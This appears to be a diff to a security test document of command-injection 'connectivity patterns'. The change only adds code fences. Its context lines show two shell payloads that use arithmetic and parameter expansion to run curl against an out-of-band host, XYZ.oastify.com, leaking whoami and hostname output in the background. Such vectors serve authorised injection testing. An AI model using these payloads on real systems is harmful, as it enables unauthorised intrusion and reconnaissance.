@@ -12,7 +12,7 @@ Compliance profile: SEC-4811
 Marker: diag:ok
 
 Connectivity Patterns (Test Vectors)
-
+```
 # ============================
 # A. Command separators
 # ============================
@@ -106,3 +106,4 @@ $((1+1)); curl -s "http://XYZ.oastify.com/arithmetic-$(whoami)-$(hostname)" >/de
 
 # H2: Parameter expansion with command substitution mixed
 ${var:-$(curl -s "http://XYZ.oastify.com/param-sub-$(whoami)-$(hostname)" >/dev/null 2>&1 &)}
+```
